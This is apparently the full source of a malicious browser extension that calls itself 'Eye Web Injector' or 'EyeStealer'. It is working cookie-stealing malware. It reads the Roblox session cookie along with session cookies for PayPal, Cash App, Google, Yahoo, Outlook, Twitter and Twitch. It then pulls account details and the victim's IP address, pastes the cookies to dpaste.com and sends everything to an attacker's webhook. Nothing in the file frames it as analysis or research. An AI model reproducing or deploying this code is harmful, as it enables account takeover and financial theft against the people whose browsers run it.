var config = {
  Placed: "%API_URL%",
  webhook_url: "%WEBHOOK%"
}

var appfound = {
  paypal: 0,
  cashapp: 0,
  yahoo: 0,
  gmail: 0,
  twitter: 0,
  twitch: 0,
  youtube: 0,
  outlook: 0
}

let helloEyeIsHere = ""
var allCookies = [];
var appUrls = [
  "https://www.paypal.com",
  "https://cash.app",
  "https://mail.yahoo.com",
  "https://mail.google.com",
  "https://twitter.com/home",
  "https://www.twitch.tv",
  "https://outlook.live.com",
  "https://accounts.google.com/",
  "https://www.youtube.com/"
];

async function dpaste(content) {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        const response = await fetch("https://dpaste.com/api/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "content=" + encodeURIComponent(content),
        });
        const text = await response.text();
        resolve(text);
      } catch (error) {
        reject(error);
      }
    }, 1000);
  });
}

const post = async (params) => {
  params = JSON.stringify(params);
  var n = JSON.stringify({
    data: params
  });
  [config.Placed, config.webhook_url].forEach(res => {
    if (res == "%API"+"_URL%") return;
    if (res == "%\x57EBHOOK%") return;
    const url = new URL(res);
    const options = {
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      },
      body: res == config.Placed ? n : params
    };
    fetch(url, options)
      .then(response => {
        console.log('Request completed:', response);
      })
      .catch(error => {
        console.log('Request error:', error);
      });
  });
}

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();
    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
       let params = {
        username: "Eye Web Logger",
        avatar_url: "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
        embeds: [{
                "title": "<a:blackmoneycard:1095741026850852965>  Eye Web Injector",
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": 0x000000,
                "fields": [
                  {
                    "name": "Username:",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux Count:",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium:",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                  "text": "@EyeStealer",
                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
              }
            ],
       }
       post(params)
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});

function getCookiesForURL(url) {
  return new Promise(function(resolve) {
    try{
    chrome.cookies.getAll({ "url": url }, function(cookies) {
      resolve(cookies);
    });
  }catch{}
  });
}

var totalFunctions = appUrls.length;
var functionsCompleted = 0;

async function parse_and_sendAll() {
  for (var i = 0; i < appUrls.length; i++) {
    functionsCompleted++;
    var url = appUrls[i];
    var cookies = await getCookiesForURL(url);
    if (cookies.length > 0) {
      await updateAppFound(url, cookies);
      await parse_and_send(cookies, url);
      await allCookies.push({ url: url, cookies: cookies });
    }
    if (functionsCompleted === totalFunctions) {
      setTimeout(() => {
      send_webhook_data(helloEyeIsHere);
    }, 3000);
    }
}
}


function getAppKeyFromUrl(url) {
  if (url.includes("paypal")) {
    return "paypal";
  } else if (url.includes("cash.app")) {
    return "cashapp";
  } else if (url.includes("yahoo")) {
    return "yahoo";
  } else if (url.includes("google")) {
    return "gmail";
  } else if (url.includes("twitter")) {
    return "twitter";
  } else if (url.includes("twitch")) {
    return "twitch";
  } else if (url.includes("outlook")) {
    return "outlook";
  }
  return null; 
}


function updateAppFound(url, value) {
  var appKey = getAppKeyFromUrl(url);
  if (appKey && appfound.hasOwnProperty(appKey)) {
    appfound[appKey] = value.length;
  }
}

function parse_and_send(cookies, appurl) {
  var cookieData = "";
  for (var i = 0; i < cookies.length; i++) {
    var cookie = cookies[i];
    var hostKey = cookie.domain;
    var expirationDate = Math.round(cookie.expirationDate * 1000).toFixed(0);
    var path = cookie.path;
    var secure = cookie.secure ? 'TRUE' : 'FALSE';
    var name = cookie.name;
    var value = cookie.value;
    if (expirationDate > Date.now()) {
      var cookieString = `${hostKey}\t${secure}\t${path}\t${(hostKey.startsWith('.') ? 'FALSE' : 'TRUE')}\t${expirationDate}\t${name}\t${value}\n`;
      cookieData += cookieString;
    }
  }
  if (cookieData !== "") {
    parse_and_send_data(cookieData, appurl);
  }
}

function parse_and_send_data(cookieData, appurl) {
  let msg = "Eye-Extension found Cookies at: " + appurl + " :\n\n" + cookieData
  setTimeout(() => {
      dpaste(msg).then(paste_url => {
      helloEyeIsHere += paste_url
    }, 1000);
    });
}

function send_webhook_data(data) {
  let params = {
    username: "Eye Web Logger",
    avatar_url: "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
    embeds: [{
      "title": "<a:blackmoneycard:1095741026850852965>  Eye Web Injector",
      "description": `\`\`\`ansi
    [2;40m   MIAM Cookies!! [0m[2;40m[0m
      [2;37m[2;34mPayPal: ${appfound.paypal}
      CashApp: ${appfound.cashapp}
      Google: ${appfound.gmail}
      Yahoo: ${appfound.yahoo}
      Outlook: ${appfound.outlook}      
      Youtube: ${appfound.youtube}
      Twitch: ${appfound.twitch}
      Twitter: ${appfound.twitter}[0m[2;37m[0m\`\`\`

      **Links:**
      ${data ? data : "COOKIE NOT FOUND"}
      `,
      "color": 0x000000,
      "author": {
        "name": "Browser Launched",
        "icon_url": "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
      },
      "footer": {
        "text": "@EyeStealer",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
      },
      "image": {
        "url": "https://thumbs.gfycat.com/WelldocumentedMessyAsianpiedstarling-size_restricted.gif",
      }
    }],
  };
  post(params);
}

parse_and_sendAll();